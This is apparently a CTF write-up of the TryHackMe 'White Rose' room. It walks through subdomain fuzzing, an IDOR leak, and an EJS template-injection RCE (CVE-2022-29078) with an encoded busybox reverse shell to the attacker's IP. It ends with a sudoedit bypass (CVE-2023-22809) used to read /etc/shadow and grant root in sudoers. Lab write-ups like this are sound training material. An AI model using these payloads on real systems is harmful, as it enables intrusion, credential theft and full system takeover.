---
title: 'TryHackMe: White Rose'
author:  Smyle :)
categories: [TryHackMe]
description: "Yet another Mr. Robot themed challenge."
tags: [CTF, Easy, ejs ]
render_with_liquid: false
media_subpath: /images/White_Rose/
image:
  path: intro.png
---

![Tryhackme Room Link](room.png){: width="600" height="150" .shadow }
_<https://tryhackme.com/room/whiterose>_

### Task: 1 Welcome
**Welcome to Whiterose**   
  This challenge is based on the `Mr. Robot episode` "409 Conflict". Contains spoilers!
Go ahead and start the machine, it may take a few minutes to fully start up.
And oh! I almost forgot! - You will need these: `Olivia Cortez:olivi8`

![spider](spider.png){: width="800" height="150" .shadow }

## Scanning
As you know, scanning is the first phase of **reconnaissance** used to identify open ports and the services running on them. To gather this information, we use a powerful network scanning tool called `Nmap`
```console
$ nmap -sCV 10.10.103.228             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-26 10:46 IST
Nmap scan report for 10.10.103.228
Host is up (0.46s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.34 seconds
```
The port 22 we have SSH and on port 80 we have an `ngix/1.14.0` web server.
Whenever I try to access port 80, it redirects me to `cyprusbank.thm`
So I’ll need to add an entry for it in my `/etc/hosts` file
```console
sudo nano /etc/hosts
$IP  cyprusbank.thm
```
After navigating to `cyprusbank.thm`
which displays a message saying:

![Bank](white1.png){: width="800" height="150" .shadow }

We can see that the `cyprusbank.thm` domain is currently under maintenance, so we can try to discover `subdomains` there might be something interesting hidden there

To find **subdomains**, we’ll use `ffuf`, which is a popular and powerful tool for **fuzzing**. Let’s see if it helps us discover any **subdomains** that might lead to something interesting

### Enumeration

```console
$ ffuf -u "http://cyprusbank.thm" -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt         

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cyprusbank.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.cyprusbank.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

smtp                    [Status: 200, Size: 57, Words: 1, Lines: 4, Duration: 496ms]
shop                    [Status: 200, Size: 57, Words: 1, Lines: 4, Duration: 496ms]
whm                     [Status: 200, Size: 57, Words: 1, Lines: 4, Duration: 470ms]
demo                    [Status: 200, Size: 57, Words: 1, Lines: 4, Duration: 498ms]
test                    [Status: 200, Size: 57, Words: 1, Lines: 4, Duration: 495ms]
cpanel                  [Status: 200, Size: 57, Words: 1, Lines: 4, Duration: 470ms]
dev                     [Status: 200, Size: 57, Words: 1, Lines: 4, Duration: 496ms]
www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 499ms]

                                  [REDACTED]
```
Now that we’ve discovered several subdomains, we need to filter out the less interesting or duplicate responses.
To do this, we can use the `-fw` (filter by words) flag in `ffuf`.

In our case, we noticed that most of the default responses have `1` word, but there are also responses with more words (like 19 or others). So, by applying the `-fw` filter, we can exclude the common or default responses and focus on **subdomains** that return different or potentially meaningful content.
```console
$ ffuf -u "http://cyprusbank.thm" -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 1 -s -t 50 
www
admin
```
The most interesting subdomain we found is `admin.cyprusbank.thm`. To access it properly in our browser, we simply need to add an entry for it in the `/etc/hosts` file. 

After navigating to `admin.cyprusbank.thm`, we see *Admin Panel*  interface.
![Admin_Panel](admin.png){: width="800" height="150" .shadow }

If you remember, we were given a **username and password** at the start  so we can simply enter those credentials into the *Admin Panel* and log in

>**Q: What's Tyrell Wellick's phone number?**

| Name              | Balance           | Phone        |
|-------------------|--------------------|--------------|
| Greg Hikaru       | $49,389,308,000    | ***-***-***  |
| Avrora Arata      | $43,329,700,000    | ***-***-***  |
| Phillip Price     | $8,137,764,000     | ***-***-***  |
| Rene Barnaby      | $83,233,700,000    | ***-***-***  |
| Marijose Kyoko    | $91,888,000,400    | ***-***-***  |
| Zhang Yiming      | $15,889,500,000    | ***-***-***  |
| Markos Alexandra  | $80,611,330,700    | ***-***-***  |
| Kōji Patryk       | $35,988,000,000    | ***-***-***  |
| Kalervo Nigel     | $34,313,810,800    | ***-***-***  |
| Otto Giampiero    | $39,117,230,000    | ***-***-***  |
| Tomás Bérenger    | $15,797,471,000    | ***-***-***  |
| **Tyrell Wellick**| **$20,855,900,000**| ***-***-***  |
| Michael Leilani   | $55,659,901,000    | ***-***-***  |
| Kaapo Tu          | $31,999,939,100    | ***-***-***  |
| Peter Natalia     | $22,489,400,000    | ***-***-***  |

Unfortunately, the phone numbers are *hidden*, and we don't have permission to access the Settings section.
However, there’s still one option we can try. When we go to the **Messages panel**, we notice that the URL contains a parameter like ?`c=5`. This might indicate the ID or index of the message being viewed.
As we increase the value of the c parameter, the number of visible messages also increases — for example:

* c=1 shows 1 message
* c=2 shows 2 messages
...and so on, up to c=10

> But here's where it gets interesting:

If we go beyond c=10, the application starts revealing sensitive information, such as credentials.
This behavior further confirms an IDOR vulnerability, and also suggests poor access control, since we're able to access data that should be restricted just by tweaking a URL parameter.
![Creds](username_pass.png){: width="800" height="150" .shadow }

After logging in successfully, we are able to view the full *phone numbers* that were previously `Hidden Accounts`
  
| Name             | Balance           | Phone        |
|------------------|--------------------|--------------|
| Greg Hikaru      | $49,389,308,000    | 426-230-0268 |
| Avrora Arata     | $43,329,700,000    | 740-092-0695 |
| Tyrell Wellick   | $20,855,900,000    | [REDACTED]   |
| Michael Leilani  | $55,659,901,000    | 169-245-1295 |
| Kaapo Tu         | $31,999,939,100    | 295-855-8030 |
| Peter Natalia    | $22,489,400,000    | 568-268-0925 |

![tyrell](tyrell.gif){: width="800" height="150" .shadow }

Now we can also access the **Settings panel**.
When we click on it, it prompts us to enter the customer’s name and password.
Since we don’t know the correct credentials, we can input any test values for the username and password, and then use Burp Suite to intercept the request.
![Panel](panelll.png){: width="800" height="150" .shadow }

We notice is that the passwords are reflected. This immediately draws attention to `XSS` or `SSTI`
By capturing the request in `Burp`, we can analyze the structure and possibly try methods like:

>I change `username` and `Password` after the request is capture in Burp So don't confuse :)
{: .prompt-warning}

* Fuzzing usernames and passwords
* Checking for weak or default credentials
* Testing for IDOR or logic flaws
![Hacker](hackeer.png){: width="800" height="150" .shadow }

> To gain a shell, we have two potential options:
{: .prompt-tip}

* Remove the password=hacker parameter:
* Find hidden or vulnerable parameters:
> Both give the 500 error we use second option you can also use 1st option as you wish :)

> *To find the hidden parameter, we can use the ffuf command*

```console
$ ffuf -u "http://admin.cyprusbank.thm/settings" -X POST -d "name=Smyle&password=Smyle&FUZZ=test" -H "Cookie: connect.sid=s%3A2hP7PCXrPOgc1Bac8mjAYi-W-NFGmSVz.mPNDA4PMqcsBeuVdMdLc0Z1ccqpFZFus73pJDWG2A%2B8" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -fs 1632 -s -t 100
.mysql.txt
reply
misc
includes
```

The `-fs` flag in ffuf stands for **filter size** — it filters out results based on the response body size in bytes
![Burppp](length.png){: width="800" height="150" .shadow }

Anyway guys, I'm particularly interested in the includes parameter  when we use this parameter in the request, we receive an error in the response
![Burppp2](Burpp2.png){: width="800" height="150" .shadow }

```console
TypeError: /home/web/app/views/settings.ejs:4
```
**Alright! If you're not familiar with settings.ejs, here's a quick overview**

* .ejs stands for `Embedded JavaScript`, which is a templating language used in Node.js applications.
* settings.ejs is likely a template file that generates the HTML for the Settings page of a web application.
* EJS lets developers inject JavaScript code into HTML using <%= %> or <% %> syntax.
* After searching for a while, I came across this vulnerability:`CVE-2022-29078` [link](https://eslam.io/posts/ejs-server-side-template-injection-rce/)

So first, we start our Python server to check whether `SSTI` (Server-Side Template Injection) is present or not
```console
python3 -m http.server 80
```
After that:
Use the Payload
```console
[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl 10.8.128.221');s
```
![Attacker](attack.png){: width="800" height="150" .shadow }

Alright, we received a ✅200 OK response, which is a good sign! 
We also check the python server:
```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.218.194 - - [26/May/2025 13:55:41] "GET / HTTP/1.1" 200 -
10.10.218.194 - - [26/May/2025 13:55:42] "GET / HTTP/1.1" 200 -
10.10.218.194 - - [26/May/2025 13:55:43] "GET / HTTP/1.1" 200 -
```
The response is coming back — so it's confirmed that `✅SSTI` (Server-Side Template Injection) is present. 

### Shell
To get a shell, I’m using `BusyBox` [Reverse Shell](https://www.revshells.com), but you can also use a Python reverse shell if Python is available on the target

```console
POST /settings HTTP/1.1
Host: admin.cyprusbank.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 212
Origin: http://admin.cyprusbank.thm
Connection: keep-alive
Referer: http://admin.cyprusbank.thm/settings
Cookie: connect.sid=s%3A2hP7PCXrPOgc1Bac8mjAYi-W-NFGmSVz.mPNDA4PMqcsBeuVdMdLc0Z1ccqpFZFus73pJDWG2A%2B8
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=test&password=hacker&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -c "echo YnVzeWJveCBuYyAxMC44LjEyOC4yMjEgNDQ0NCAtZSBiYXNo | base64 -d | bash"');//
```

>I encoded the BusyBox reverse shell command using Base64, like this:
{: .prompt-tip}

>`busybox nc 10.8.128.221 4444 -e bash |base64 You can also use the command without encoding, as shown below` 

### User Flag
So guys, we successfully got a shell!
![shell](shell.png){: width="800" height="150" .shadow }

**For stable shell**
```console
python3 -c 'import pty;pty.spawn("/bin/bash")'    or   script -qc /bin/bash /dev/null
export TERM=xterm
ctrl +z
stty raw -echo;fg
press enter
```

>**Q: What is the user.txt flag?**

```console
cat /home/web/user.txt
```
### Root Flag
We found that we can run `sudoedit` as root without needing a password, but only for the specific file `/etc/nginx/sites-available/admin.cyprusbank.thm`

After a brief search, we discovered a bypass for `sudoedit CVE-2023-22809.`[link](https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis) This affects sudo versions up to **1.9.12p1** and lets us read and modify any files by setting the `EDITOR` environment variable

```console
sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
After a quick search, we came across a `sudoedit` bypass `CVE-2023-22809`. This vulnerability affects sudo versions up to `1.9.12p1` and allows us to read or modify arbitrary files by setting the `EDITOR` environment variable.

We see that we have installed a vulnerable version of `sudo`
![sudoedit](sudoedit.png){: width="800" height="150" .shadow }

Ww export `EDITOR`="nano -- /etc/shadow" we attempt to make vi open `/etc/shadow` directly when `sudoedit` is used
>you can use vim also but in our case we use nano
{: .prompt-info}

```console
$ export EDITOR="nano -- /etc/shadow"
$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
We are able to read `/etc/shadow` file
![root](root.png){: width="800" height="150" .shadow }

Next we can try to read the `root flag`
```console
export EDITOR="nano -- /root/root.txt"
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
``` 
Gotcha! We are able to read the root flag
>**Q: What is the root.txt flag?**
![tool](tool.png){: width="800" height="150" .shadow }

### Root Shell
Now it's time to become `root`.
**To escalate our privileges to root, we try edit the `/etc/sudoers` file.**
```console
export EDITOR="nano -- /etc/sudoers"
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

Now we can read /etc/sudoers
![Final_Root](final_root.png){: width="800" height="150" .shadow }

Now , We simply add the following line as the `Second entry` in the file:
```console
root ALL=(ALL:ALL) ALL
web ALL=(root) NOPASSWD: ALL            <<<<<     ""Here We G0"
## Uncomment to allow members of group wheel to execute any command
# %wheel ALL=(ALL:ALL) ALL

## Same thing without a password
# %wheel ALL=(ALL:ALL) NOPASSWD: ALL

## Uncomment to allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL
web     ALL=(root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
## Uncomment to allow any user to run sudo if they know the password
## of the user they are running the command as (root by default).
# Defaults targetpw  # Ask for the password of the target user
# ALL ALL=(ALL:ALL) ALL  # WARNING: only use this together with 'Defaults targetpw'

## Read drop-in files from /etc/sudoers.d
```
Now we become finally `root`
![Roo0t](Rooot.png){: width="800" height="150" .shadow }

Now that we have root access, we can run any command on the system. For the sake of completing the room, we just need to retrieve the root flag
![flag](root_flag.png){: width="800" height="150" .shadow }

![Climax](last.webp){: width="800" height="150" .shadow }

[Fandom](https://mrrobot.fandom.com/wiki/Whiterose)